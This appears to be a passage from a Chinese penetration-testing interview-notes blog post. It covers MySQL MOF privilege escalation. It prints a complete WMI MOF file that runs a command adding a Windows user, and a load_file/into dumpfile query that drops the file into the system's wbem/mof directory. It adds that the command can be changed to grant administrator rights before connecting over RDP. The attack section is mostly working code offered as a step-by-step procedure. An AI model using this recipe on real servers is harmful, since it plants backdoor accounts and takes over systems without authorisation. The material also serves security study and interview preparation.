<h3 id="Mysql-mof提权"><a href="#Mysql-mof提权" class="headerlink" title="Mysql mof提权"></a>Mysql mof提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name  = &quot;filtP2&quot;;</span><br><span class="line">Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second = 5&quot;;</span><br><span class="line">QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name = &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">ScriptText =</span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user waitalone waitalone.cn /add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer   = $Consumer;</span><br><span class="line">Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中的第18行的命令，上传前请自己更改。</p>
<p>2、执行load_file及into dumpfile把文件导出到正确的位置即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load file(&#x27;c:/wmpub/nullevt.mof&#x27;) into dumpfile &#x27;c:/windows/system32/wbem/mof/nullevt.mov&#x27;</span><br></pre></td></tr></table></figure>

<p>执行成功后，即可添加一个普通用户，然后你可以更改命令，再上传导出执行把用户提升到管理员权限，然后3389连接之就ok了。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">GML</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/04/16/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E7%BB%8F%E6%95%B4%E7%90%86/">http://example.com/2023/04/16/渗透测试面经整理/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">GML的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%89%E5%85%A8/">安全</a><a class="post-meta__tags" href="/tags/%E9%9D%A2%E7%BB%8F/">面经</a></div><div class="post-share"><div class="social-share" data-image="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/mmexport1681377706600.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/weixin.png" target="_blank"><img class="post-qr-code-img" src="/img/weixin.png" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/zhifubao.jpg" target="_blank"><img class="post-qr-code-img" src="/img/zhifubao.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2023/04/14/file-upload%E7%BB%95%E8%BF%87/" title="file-upload绕过"><img class="cover" src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/Untitled.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">file-upload绕过</div></div><div class="info-2"><div class="info-item-1"> 前端校验前段校验，狗都防不了 MIME验证使用bp抓包，修改上传的content-type为image&#x2F;png 文件内容头校验主要是检测文件内容开始处的文件幻数 （1） .JPEG;.JPE;.JPG，”JPGGraphic File” （2） .gif，”GIF 89A” （3） .zip，”Zip Compressed” （4） .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile” 分析是否为黑名单或白名单上传的后缀名写一个不存在的，如：shell.xxx 查看是否上传成功，成功为黑名单，失败为白名单 黑名单 特殊后缀 大小写绕过 双重后缀 空格绕过 点号绕过 特殊字符::$DATA绕过 加点空格点 上传shell.php 然后用bp改后缀加点空格点（即文件名为shell.php....</div></div></div></a><a class="pagination-related" href="/2023/04/16/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" title="linux常用命令"><img class="cover" src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220901131138141.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">linux常用命令</div></div><div class="info-2"><div class="info-item-1">              基本命令：pwd    显示当前工作路径ls     查看目录中的文件  ls -a 显示隐藏文件cd     切换目录clear  清除屏幕reset  真正地清空终端屏幕tab    自动补全命令 mkdir  创建目录&#x2F;文件夹rmdir  删除文件夹    删除为空的文件夹rm     删除文件-r: 递归删除目录及其内容  -f强制删除touch  创建文件find   查找文件    -name 代表按文件名查找cp     拷贝文件    -a:会保留文件原有属性which  查看命令位置mv     移动文件&#x2F;重命名重命名：mv 目录名 新目录名移动： mv 需要移动的目录名  目的地cat    查看文件内容echo   写入内容    一个&gt; , 没有文件则创建；有文件就重写    两个&gt;, 没有文件则创建，有文件新内容会添加在原内容后面 cd ..   回到上一级、、cd     cd ~   切换到当前用户目录 vim编辑器三种模式：1.命令行模式：复制、粘贴、删除、移动光标2.编辑模式：编辑文本...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2023/04/13/OWASP-Top-10/" title="OWASP Top 10"><img class="cover" src="https://github.com/OWASP/www-project-top-ten/raw/master/assets/images/mapping.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-13</div><div class="info-item-2">OWASP Top 10</div></div><div class="info-2"><div class="info-item-1">OWASP Top 10 是针对开发人员和 Web 应用程序安全性的标准意识文档。它代表了对 Web 应用程序最关键的安全风险的广泛共识。 开发人员在全球范围内将其视为迈向更安全编码的第一步。 公司应采用本文件并开始确保其网络应用程序将这些风险降至最低的过程。使用 OWASP Top 10 可能是将组织内的软件开发文化转变为生成更安全代码的文化的最有效的第一步。 十大 Web 应用程序安全风险2021 年的前 10 名中有 3 个新类别、4 个更改了名称和范围的类别以及一些合并。   A01:2021-Broken Access  失效的访问控制从第五位上移；94% 的应用程序都针对某种形式的损坏访问控制进行了测试。映射到损坏的访问控制的 34 个常见弱点枚举 (CWE) 在应用程序中的出现次数比任何其他类别都多。 A02:2021-Cryptographic Failures 加密失败上升一位到第 2 位，以前称为敏感数据泄露，这是一个广泛的症状而不是根本原因。这里重新关注与密码学相关的故障，这些故障通常会导致敏感数据泄露或系统受损。 A03:2021-Injection...</div></div></div></a><a class="pagination-related" href="/2023/04/14/file-upload%E7%BB%95%E8%BF%87/" title="file-upload绕过"><img class="cover" src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/Untitled.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-14</div><div class="info-item-2">file-upload绕过</div></div><div class="info-2"><div class="info-item-1"> 前端校验前段校验，狗都防不了 MIME验证使用bp抓包，修改上传的content-type为image&#x2F;png 文件内容头校验主要是检测文件内容开始处的文件幻数 （1） .JPEG;.JPE;.JPG，”JPGGraphic File” （2） .gif，”GIF 89A” （3） .zip，”Zip Compressed” （4） .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile” 分析是否为黑名单或白名单上传的后缀名写一个不存在的，如：shell.xxx 查看是否上传成功，成功为黑名单，失败为白名单 黑名单 特殊后缀 大小写绕过 双重后缀 空格绕过 点号绕过 特殊字符::$DATA绕过 加点空格点 上传shell.php 然后用bp改后缀加点空格点（即文件名为shell.php....</div></div></div></a><a class="pagination-related" href="/2023/04/17/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%86%E7%B1%BB%E5%8F%8A%E6%A6%82%E5%BF%B5/" title="sql注入的分类及概念"><img class="cover" src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/iShot_2023-04-17_21.15.05.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-17</div><div class="info-item-2">sql注入的分类及概念</div></div><div class="info-2"><div class="info-item-1">基于从服务器接收到的响应 基于错误的 SQL 注入   联合查询的类型   堆查询注射   SQL 盲注  基于布尔 SQL 盲注Mysql 注入  基于时间的 SQL 盲注   基于报错的 SQL 盲注     基于如何处理输入的 SQL 查询（数据类型） 基于字符串   数字或整数为基础的   基于程度和顺序的注入 一阶注射   一阶注射是指输入的注射语句对 WEB 直接产生了影响，出现了结果   二阶注射   二阶注入类似存 储型 XSS，是指输入提交的语句，无法直接对 WEB 应用程序产生影响，通过其它的辅助间 接的对 WEB 产生危害，这样的就被称为是二阶注入.    基于注入点的位置上的 通过用户输入的表单域的注射。   通过 cookie 注射。   通过服务器变量注射。 （基于头部信息的注射）   以上摘抄自《sqlilabsg过关手册注入天书》自己大致总结如下  联合查询 堆叠查询 报错注入 布尔盲注 时间盲注 宽字节注入 二阶注入 头部注入  数字型&#x2F;字符型注入判断   id 数字型（id&#x3D;id） 字符型...</div></div></div></a><a class="pagination-related" href="/2023/04/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="信息收集"><img class="cover" src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/mmexport1681377706600.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-17</div><div class="info-item-2">信息收集</div></div><div class="info-2"><div class="info-item-1">一、域名信息whois查询whois信息在线收集地址站长之家：...</div></div></div></a><a class="pagination-related" href="/2023/04/13/%E7%B3%BB%E7%BB%9F%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/" title="系统敏感文件"><img class="cover" src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/mmexport1681377706600.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-13</div><div class="info-item-2">系统敏感文件</div></div><div class="info-2"><div class="info-item-1">1234567891011121314151617181920212223242526Windows：   C:\boot.ini  //查看系统版本   C:\Windows\System32\inetsrv\MetaBase.xml  //IIS配置文件   C:\Windows\repair\sam  //存储系统初次安装的密码   C:\Program Files\mysql\my.ini  //Mysql配置   C:\Program Files\mysql\data\mysql\user.MYD  //Mysql root   C:\Windows\php.ini  //php配置信息   C:\Windows\my.ini  //Mysql配置信息Linux：   /root/.ssh/authorized_keys  //SSH密钥对中的公钥列表   /root/.ssh/id_rsa  //SSH密钥对中的私钥部分   /root/.ssh/id_ras.keystore   /root/.ssh/known_hosts  //系统曾经连接过的 SSH...</div></div></div></a><a class="pagination-related" href="/2022/08/26/%E9%9D%A2%E7%BB%8F%E6%95%B4%E7%90%86/" title="面经整理"><img class="cover" src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/5e5be2fbfcdc61f3d6478a84f590d9ee.jpeg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-26</div><div class="info-item-2">面经整理</div></div><div class="info-2"><div class="info-item-1">一、计算机网络0 - OSI七层模型和TCP&#x2F;IP四层模型是什么？都有什么协议？OSI 七层模型及其包含的协议如下:  物理层: 通过媒介传输比特,确定机械及电气规范，传输单位为bit，主要包括的协议为：IEE802.3 CLOCK RJ45 数据链路层: 将比特组装成帧和点到点的传递,传输单位为帧,主要包括的协议为MAC VLAN PPP 网络层：负责数据包从源到宿的传递和网际互连，传输单位为包,主要包括的协议为IP ARP ICMP 传输层：提供端到端的可靠报文传递和错误恢复，传输单位为报文,主要包括的协议为TCP UDP 会话层：建立、管理和终止会话，传输单位为SPDU，主要包括的协议为RPC NFS 表示层: 对数据进行翻译、加密和压缩,传输单位为PPDU，主要包括的协议为JPEG ASII **应用层: **允许访问OSI 环境的手段,传输单位为APDU，主要包括的协议为 FTP HTTP DNS  TCP&#x2F;IP 4 层模型包括：                                                            ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/9c4992ebfcaef0dc98f5ab70af9a29f76bc89ca4.jpg%40100Q.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">GML</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/kaliluying"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/kaliluying" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:kaliluying@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://space.bilibili.com/671157361" target="_blank" title="BiliBili"><i class="fa fa-tv"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">万物皆有裂痕，那是光进来的地方。<br>以技术为刀，驱散隐秘角落之下的安全阴影。<br>以信仰为剑，指引大众视野之外的阡陌崎岖。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E6%B5%81%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">思路流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞挖掘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-amp-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞利用&amp;权限提升</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%85%E9%99%A4%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE-amp-%E8%BE%93%E5%87%BA%E6%8A%A5%E5%91%8A"><span class="toc-number">1.4.</span> <span class="toc-text">清除测试数据&amp;输出报告</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E6%B5%8B"><span class="toc-number">1.5.</span> <span class="toc-text">复测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E6%8A%A4"><span class="toc-number">2.</span> <span class="toc-text">SQL注入防护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%82%E6%95%B0%E5%8C%96%E6%9F%A5%E8%AF%A2%E5%8F%AF%E4%BB%A5%E9%98%B2%E6%AD%A2sql%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">为什么参数化查询可以防止sql注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">4.</span> <span class="toc-text">sql的报错注入原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">报错函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E7%9A%84%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E7%94%A8%E5%88%B0%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">5.</span> <span class="toc-text">sql的布尔注入原理和用到的函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-number">5.1.</span> <span class="toc-text">函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap%E5%B8%B8%E7%94%A8%E7%9A%84%E5%8F%82%E6%95%B0%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">6.</span> <span class="toc-text">sqlmap常用的参数有哪些</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap%E4%B8%AD%E7%9A%84%E2%80%93os-shell%E5%8E%9F%E7%90%86"><span class="toc-number">7.</span> <span class="toc-text">sqlmap中的–os-shell原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">8.</span> <span class="toc-text">文件上传绕过方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%9C%89%E5%93%AA%E4%BA%9B%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F"><span class="toc-number">9.</span> <span class="toc-text">文件上传有哪些防护方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss%E7%9A%84%E5%87%A0%E7%A7%8D%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">10.</span> <span class="toc-text">xss的几种类型及漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#csrf%E3%80%81xss%E5%92%8Cssrf%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">11.</span> <span class="toc-text">csrf、xss和ssrf之间的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E4%B8%AD%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">12.</span> <span class="toc-text">windows中查看进程的命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E4%B8%AD%E7%BB%93%E6%9D%9F%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">13.</span> <span class="toc-text">windows中结束进程的命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">14.</span> <span class="toc-text">linux常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%92%8C%E5%AF%B9%E5%BA%94%E7%9A%84%E6%9C%8D%E5%8A%A1"><span class="toc-number">15.</span> <span class="toc-text">常见的端口和对应的服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSI%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">16.</span> <span class="toc-text">OSI七层模型有哪些</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%97%B6%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4%E6%B3%9B%E8%A7%A3%E6%9E%90%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">17.</span> <span class="toc-text">如何处理信息收集时子域名爆破泛解析的问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%B3%9B%E8%A7%A3%E6%9E%90%E7%9A%84%E6%88%90%E5%9B%A0"><span class="toc-number">17.1.</span> <span class="toc-text">子域名泛解析的成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4%E4%B8%AD%E8%A7%A3%E5%86%B3%E6%B3%9B%E8%A7%A3%E6%9E%90%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">17.2.</span> <span class="toc-text">子域名爆破中解决泛解析的方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E4%B8%A4%E7%A7%8D%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F"><span class="toc-number">18.</span> <span class="toc-text">mysql两种提权方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mysql-UDF%E6%8F%90%E6%9D%83"><span class="toc-number">18.1.</span> <span class="toc-text">Mysql_UDF提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mysql-mof%E6%8F%90%E6%9D%83"><span class="toc-number">18.2.</span> <span class="toc-text">Mysql mof提权</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/02/10/%E5%9C%A8ubuntu%E4%B8%AD%E5%AE%89%E8%A3%85ns-3-3-43/" title="在ubuntu中安装ns-3 3.43"><img src="https://www.nsnam.org/assets/img/ns-3-notext.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="在ubuntu中安装ns-3 3.43"/></a><div class="content"><a class="title" href="/2025/02/10/%E5%9C%A8ubuntu%E4%B8%AD%E5%AE%89%E8%A3%85ns-3-3-43/" title="在ubuntu中安装ns-3 3.43">在ubuntu中安装ns-3 3.43</a><time datetime="2025-02-10T11:09:56.000Z" title="发表于 2025-02-10 19:09:56">2025-02-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/17/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%86%E7%B1%BB%E5%8F%8A%E6%A6%82%E5%BF%B5/" title="sql注入的分类及概念"><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/iShot_2023-04-17_21.15.05.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sql注入的分类及概念"/></a><div class="content"><a class="title" href="/2023/04/17/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%86%E7%B1%BB%E5%8F%8A%E6%A6%82%E5%BF%B5/" title="sql注入的分类及概念">sql注入的分类及概念</a><time datetime="2023-04-17T07:44:06.000Z" title="发表于 2023-04-17 15:44:06">2023-04-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="信息收集"><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/mmexport1681377706600.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="信息收集"/></a><div class="content"><a class="title" href="/2023/04/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="信息收集">信息收集</a><time datetime="2023-04-17T01:48:26.000Z" title="发表于 2023-04-17 09:48:26">2023-04-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/16/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" title="linux常用命令"><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220901131138141.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="linux常用命令"/></a><div class="content"><a class="title" href="/2023/04/16/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" title="linux常用命令">linux常用命令</a><time datetime="2023-04-16T07:58:40.000Z" title="发表于 2023-04-16 15:58:40">2023-04-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/16/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E7%BB%8F%E6%95%B4%E7%90%86/" title="渗透测试面经整理"><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/mmexport1681377706600.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透测试面经整理"/></a><div class="content"><a class="title" href="/2023/04/16/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E7%BB%8F%E6%95%B4%E7%90%86/" title="渗透测试面经整理">渗透测试面经整理</a><time datetime="2023-04-16T06:26:23.000Z" title="发表于 2023-04-16 14:26:23">2023-04-16</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2025 By GML</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><p><a target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为Hexo"></a>&nbsp;<a target="_blank" href="https://demo.jerryc.me/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用butterfly"></a>&nbsp;<a target="_blank" href="https://github.com/kaliluying"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由Gtihub托管"></a>&nbsp;<a target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script defer src="https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js"></script><script data-pjax defer src="https://npm.elemecdn.com/tzy-blog/lib/js/theme/chocolate.js"></script><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
  function butterfly_clock_anzhiyu_injector_config(){
    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="https://fastly.jsdelivr.net/gh/tzy13755126023/BLOG_SOURCE/theme_f/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
    console.log('已挂载butterfly_clock_anzhiyu')
    if(parent_div_git) {
      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
